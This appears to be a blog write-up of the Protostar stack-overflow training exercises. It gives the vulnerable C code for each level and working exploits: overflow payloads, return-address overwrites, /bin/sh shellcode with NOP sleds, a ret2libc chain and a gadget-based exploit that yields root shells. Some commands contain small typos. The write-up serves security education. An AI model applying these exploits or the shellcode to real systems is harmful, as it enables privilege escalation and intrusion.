---
layout: post
title:  "Exploit Excersises Protostar Stack"
date:   2020-1-10 0:05:00 +0000
categories: Exploit-Excersises
---
In this series ill be covering the protostar excersises from exploit-excersises / exploit.education. Its a series of challenges designed to teach common linux exploits that will occur in CTF challenges.
Protostar introduces a range of things in a way that takes it from introductory to more advanced:
- Network programming
- Byte order
- Handling sockets
- Stack overflows
- Format strings
- Heap overflows


# Stack Zero
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
{% endhighlight %}

Vulnerability 
We can see the code above is copying user supplied input into a buffer of 64 bytes (line 11), then if the stack variable 'modified' is not 0, it will print the win statement. Supplying an input larger than the available buffer should overflow and overwrite the modified variable.
Exploit:
{% highlight bash %}
python -c 'print "A"*65' | ./stack0
{% endhighlight %}
# Stack One
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
{% endhighlight %}

Vulnerabiliy
This time the application takes input as an argument, it then string copies the argument into a limited buffer. The modified check this time is actually checking values on the stack to equal 'abcd'.

Exploit:
{% highlight bash %}
./stack1 $(python -c "print 'a'*64 + 'dcba'"
# First set of 'a's fills the buffer
# Then the 'dcba' is written over the variable (endian conversion)
{% endhighlight %}
# Stack Two
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
{% endhighlight %}
Vulnerability
This time the application isnt taking direct input through args or stdin, but through an environment variable. Again the program is checking if a modified variable contains a string we have to plant on the stack.
Exploit:
{% highlight bash %}
GREENIE=`python -c "print 'A'*64' + '\x0a\x0d\x0a\x0d'"`
export GREENIE
./stack2
{% endhighlight %}
# Stack Three
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
{% endhighlight %}
Vulnerability
The code on line 18 is still a problem, its allowing us to overflow a limited buffer. This time, we have a win function (line 6) that doesnt get called in normal condition flow. We can use our overflow to reach to EIP and direct program flow to that function.

Exploit:
{% highlight bash %}
# objdump -D stack3 | grep win
python -c "print 'A'*64 + '\x24\x84\x04\x08'" | ./stack3
# calling function pointer, jumping to 0x08048424
# code flow successfully changed
{% endhighlight %}
# Stack Four
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
{% endhighlight %}
Vulnerability
From the code above we can see a win function that doesnt get called in usual code flow, because we have an overflow that can overwrite EIP, we can overflow up to EIP then throw the address of the uncalled function in there for it to jump to.
Exploit:
{% highlight bash %}
(python -c "print 'A'*76 + '\xf4\x83\x04\x08'";) | ./stack4
{% endhighlight %}
# Stack Five
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
{% endhighlight %}
Vulnerability
The application from the code is incredibly small as we can see. We will have to introduce code in the form of shellcode and get it to execute within memory by manipulating jump calls.
Exploit:
{% highlight bash %}
# Finding our offset
gdb-peda$ pattern_create 130
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAk'
<crash in local gdb>
gdb-peda$ pattern_offset 0x41344141
1093943617 found at offset: 76
gdb-peda$ 
# Getting shellcode

# Getting a stack address
(gdb) x/10s $esp
0xbffffcc0:	 'B' <repeats 36 times>
0xbffffce5:	 "\375\377\277&\006\377\267\260\372\377\267(\033\376\267\364\177", <incomplete sequence \375\267>
0xbffffcf9:	 ""
0xbffffcfa:	 ""
0xbffffcfb:	 ""


# Putting it all together
# offset + address on stack + nops + shellcode
echo `python -c 'print("A"*76 + "\xc0\xfc\xff\xbf" + "\x90"*20 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'` | ./stack5
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# 

{% endhighlight %}
# Stack Six
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
{% endhighlight %}
Vulnerability
We can still overwrite critical pointers in the application...
Theres still a solid buffer overflow here but this time we have to use it to call functions ourself out of the c library. This is more commonly known as Ret2Libc, we will setup a call to /bin/bash with libc offsets in memory then should be rewarded with a shell in return.

Exploit:
{% highlight bash %}
# Finding the EIP offset
gdb-peda$ pattern_create 180
<removed for sanity>
> Input into stdin through gdb
Program received signal SIGSEGV, Segmentation fault.
0x41414a41 in ?? ()
(gdb) 

gdb-peda$ pattern_offset 0x41414a41
1094797889 found at offset: 80

# Getting libc base
ldd stack6
        linux-gate.so.1 =>  (0xb7fe4000)
        libc.so.6 => /lib/libc.so.6 (0xb7e99000)
        /lib/ld-linux.so.2 (0xb7fe5000)
# Getting /bin/sh address
strings -a -t x /lib/libc.so.6 | grep /bin/sh
 11f3bf /bin/sh

# Libc offset
python -c 'offset = 0xb7fe4000 + 0x11f3bf; print hex(offset)'
0xb7fb63bf
# Exit address
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

# System address
(gdb) p system
$2 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

# Alternate way for /bin/sh address
dump esp with a load of bytes
(gdb) x/4000s $esp
...
0xbfffff80:	 "SHELL=/bin/sh"
...
Add 6 bytes to just get the following;
(gdb) x/s 0xbfffff80+6
0xbfffff86:	 "/bin/sh"


Values;
Address of system = 0xb7ecffb0
Address of exit = 0xb7ec60c0
Address of /bin/sh = 0xbfffff86 
offset = 80 

'A'* offset + system + exit + /bin/sh
python -c "print 'A'*80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\x86\xff\xff\xbf'" > /tmp/stack6
$ (cat /tmp/stack6.pwn2; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

{% endhighlight %}
# Stack Seven
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
{% endhighlight %}
Vulnerability 
I totally misread the task on the site with this one and spent hours trying to figure out why my ret2libc wouldnt work. :zzz:. Turns out it hints heavily at shellcode.
This time we will shove some shellcode onto the stack then call eax after some nops for the shellcode to execute.

Exploit:
{% highlight bash %}
# Getting the offset
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
<run locally and get crashed EIP address>
gdb-peda$ pattern_offset 0x41414a41
1094797889 found at offset: 80
# Getting a gadget
There was no 'jmp esp' calls so couldnt take the normal route. Luckily thats not the only way to execute shellcode in this case.

$ objdump -M intel -D stack7 | grep "call.*eax"
 8048478:	ff 14 85 5c 96 04 08 	call   DWORD PTR [eax*4+0x804965c]
 80484bf:	ff d0                	call   eax
 80485eb:	ff d0                	call   eax

# Getting shellcode
Just found some on exploitdb - /exploits/13357
# Final exploit;

$ echo `python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*25 + "\xbf\x84\x04\x08")'` | ./stack7
input path please: got path 1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
                                                                      ������������������������
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# whoami
root

{% endhighlight %}
WOOO
<br>
# Review
The stack series from exploit excercises/education is actually a great way to learn how to create stack based exploits in c applications. I would say this only works if you have the patience and motivation for self learning and reading manpages and documents. 
<br>
Thats it for the stack series of exercises. Weve gone from basic overflows to ret2libc and next ill move into format string vulnerabilities.
<br>
Exploit-Exercises:
 - [Stack](link)
 - [Format](link)
 - [Heap](link)
 - [Net](link)
 - [Final](link)
 
